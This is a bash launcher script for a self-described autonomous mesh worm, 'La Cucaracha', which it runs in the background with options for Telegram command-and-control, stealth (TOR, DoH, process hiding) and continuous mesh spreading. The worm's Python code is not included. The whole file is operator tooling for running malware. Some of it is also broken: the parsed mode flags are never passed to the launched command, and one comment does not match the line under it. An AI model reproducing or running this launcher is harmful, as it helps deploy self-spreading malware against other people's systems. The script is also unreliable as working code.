#!/bin/bash
# =============================================================================
# LA CUCARACHA — STARTUP SCRIPT
# =============================================================================
# This script launches La Cucaracha worm in autonomous mode with
# the Telegram Command Center and aggressive predator kill chain.
#
# Usage:
#   ./la-cucaracha-start.sh              # Start in autonomous mode
#   ./la-cucaracha-start.sh --stealth    # Start with stealth module
#   ./la-cucaracha-start.sh --telegram   # Start with Telegram bot
#   ./la-cucaracha-start.sh --mesh       # Start as continuous mesh node
#   ./la-cucaracha-start.sh --help       # Show all options
#
# Author: HornyPhonkAlphabet
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR" || exit 1

LA_CUCARACHA="$SCRIPT_DIR/la_cucaracha_smart.py"
LOG_DIR="$SCRIPT_DIR/logs"
PID_FILE="/tmp/la-cucaracha.pid"
TELEGRAM_CONFIG="$SCRIPT_DIR/telegram_config.json"

# Ensure log directory exists
mkdir -p "$LOG_DIR"

# Timestamp for log file
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$LOG_DIR/la-cucaracha_$TIMESTAMP.log"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   ██╗      █████╗      ██████╗██╗   ██╗ ██████╗ █████╗   ║"
echo "║   ██║     ██╔══██╗    ██╔════╝██║   ██║██╔════╝██╔══██╗  ║"
echo "║   ██║     ███████║    ██║     ██║   ██║██║     ███████║  ║"
echo "║   ██║     ██╔══██║    ██║     ██║   ██║██║     ██╔══██║  ║"
echo "║   ███████╗██║  ██║    ╚██████╗╚██████╔╝╚██████╗██║  ██║  ║"
echo "║   ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝  ║"
echo "║       >>> AUTONOMOUS MESH WORM v2.0 <<<                    ║"
echo "║       by HornyPhonkAlphabet                                 ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check for existing PID
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    if kill -0 "$OLD_PID" 2>/dev/null; then
        echo -e "${YELLOW}⚠ La Cucaracha is already running (PID: $OLD_PID)${NC}"
        echo -e "${YELLOW}  Use '$0 stop' to stop first, or 'kill $OLD_PID'${NC}"
        exit 1
    else
        echo -e "${YELLOW}⚠ Stale PID file removed${NC}"
        rm -f "$PID_FILE"
    fi
fi

# Parse arguments
MODE_ARGS=""
TELEGRAM_FLAG=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        stop)
            echo -e "${RED}Stopping La Cucaracha...${NC}"
            if [ -f "$PID_FILE" ]; then
                kill "$(cat "$PID_FILE")" 2>/dev/null
                rm -f "$PID_FILE"
            fi
            pkill -f "la_cucaracha_smart.py" 2>/dev/null
            echo -e "${GREEN}✓ La Cucaracha stopped${NC}"
            exit 0
            ;;
        status)
            echo -e "${BLUE}Checking La Cucaracha status...${NC}"
            if [ -f "$PID_FILE" ]; then
                PID=$(cat "$PID_FILE")
                if kill -0 "$PID" 2>/dev/null; then
                    echo -e "${GREEN}✓ La Cucaracha is RUNNING (PID: $PID)${NC}"
                    ps -p "$PID" -o pid,stat,etime,args | tail -1
                    exit 0
                fi
            fi
            echo -e "${RED}✗ La Cucaracha is NOT running${NC}"
            exit 1
            ;;
        --stealth)
            MODE_ARGS="$MODE_ARGS --stealth"
            echo -e "${CYAN}  [+] Stealth mode enabled${NC}"
            ;;
        --telegram)
            TELEGRAM_FLAG="--telegram"
            echo -e "${CYAN}  [+] Telegram Command Center enabled${NC}"
            ;;
        --mesh)
            MODE_ARGS="$MODE_ARGS --mesh"
            echo -e "${CYAN}  [+] Continuous mesh node mode${NC}"
            ;;
        --help)
            echo -e "${WHITE}Usage: $0 [options]${NC}"
            echo ""
            echo "Options:"
            echo "  --stealth     Enable stealth mode (TOR, DoH, process hiding)"
            echo "  --telegram    Start Telegram Command Center bot"
            echo "  --mesh        Run as continuous mesh node"
            echo "  stop          Stop running instance"
            echo "  status        Check if running"
            echo "  --help        Show this help"
            echo ""
            echo "Default: --auto mode (full autonomous navigation)"
            exit 0
            ;;
        *)
            echo -e "${YELLOW}Unknown option: $1${NC}"
            echo "Usage: $0 [--stealth] [--telegram] [--mesh] [stop|status|--help]"
            exit 1
            ;;
    esac
    shift
done

# Enable Python -S flag to avoid zope.interface namespace hang
export PYTHONHASHSEED=random

echo -e "${BLUE}════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Starting La Cucaracha worm...${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════${NC}"
echo -e "  Log file: ${CYAN}$LOG_FILE${NC}"
echo -e "  PID file: ${CYAN}$PID_FILE${NC}"
echo -e "  Telegram Bot Token: ${CYAN}$(head -c 20 "$TELEGRAM_CONFIG" 2>/dev/null | grep -o '"bot_token": *"[^"]*"' | cut -d'"' -f4 | head -c 12)...${NC}"
echo -e "  Telegram: ${CYAN}${TELEGRAM_FLAG:-DISABLED}${NC}"
echo ""

# Build the command
CMD="python3 -u $LA_CUCARACHA"

echo -e "${YELLOW}Running: $CMD${NC}"
echo ""

# Launch in background
nohup $CMD > "$LOG_FILE" 2>&1 &
PID=$!
echo $PID > "$PID_FILE"

echo -e "${GREEN}✓ La Cucaracha started with PID: $PID${NC}"
echo -e "${GREEN}✓ Log file: $LOG_FILE${NC}"
echo ""
echo -e "${YELLOW}Use '$0 status' to check status${NC}"
echo -e "${YELLOW}Use '$0 stop' to stop${NC}"
echo -e "${YELLOW}Use 'tail -f $LOG_FILE' to follow logs${NC}"

# Wait a moment and verify it's running
sleep 3
if kill -0 "$PID" 2>/dev/null; then
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  ✅ LA CUCARACHA IS ALIVE AND HUNTING            ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════╝${NC}"
else
    echo ""
    echo -e "${RED}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ❌ LA CUCARACHA DIED IMMEDIATELY                 ║${NC}"
    echo -e "${RED}║  Check log file for errors:                       ║${NC}"
    echo -e "${RED}║  $LOG_FILE              ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════╝${NC}"
    tail -20 "$LOG_FILE"
    rm -f "$PID_FILE"
    exit 1
fi
